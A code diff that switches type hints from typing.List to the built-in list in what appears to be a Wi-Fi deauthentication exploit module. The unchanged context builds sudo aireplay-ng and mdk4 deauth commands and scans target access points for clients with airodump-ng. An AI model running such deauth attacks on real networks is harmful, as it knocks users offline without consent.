@@ -19,7 +19,6 @@ All operations require an authorized lab environment with monitor-mode interface
 Version: 1.1.0
 """
 
-from __future__ import annotations
 
 import logging
 import shutil
@@ -102,7 +101,7 @@ class Exploit(Exploit):
             except Exception:
                 pass
 
-    def _scan_clients(self) -> List[str]:
+    def _scan_clients(self) -> list[str]:
         """Run a quick airodump-ng scan (5s) to detect clients connected to the target AP.
 
         Returns:
@@ -133,7 +132,7 @@ class Exploit(Exploit):
             except Exception:
                 return []
             csv_file = out_prefix + "-01.csv"
-            clients: List[str] = []
+            clients: list[str] = []
             try:
                 with open(csv_file, encoding="latin-1", errors="ignore") as f:
                     in_stations = False
@@ -151,7 +150,7 @@ class Exploit(Exploit):
             shutil.rmtree(str(scan_tmp), ignore_errors=True)
         return clients
 
-    def _build_aireplay_cmd(self) -> List[str]:
+    def _build_aireplay_cmd(self) -> list[str]:
         """Build aireplay-ng deauth command com canal."""
         cmd = ["sudo", "aireplay-ng", "--deauth", str(self.count if self.count > 0 else 15)]
         if self.target_bssid != "FF:FF:FF:FF:FF:FF":
@@ -161,7 +160,7 @@ class Exploit(Exploit):
         cmd.append(self.interface)
         return cmd
 
-    def _build_mdk4_cmd(self) -> List[str]:
+    def _build_mdk4_cmd(self) -> list[str]:
         """Build mdk4 deauth command."""
         cmd = ["sudo", "mdk4", self.interface, "d"]
         if self.target_bssid != "FF:FF:FF:FF:FF:FF":
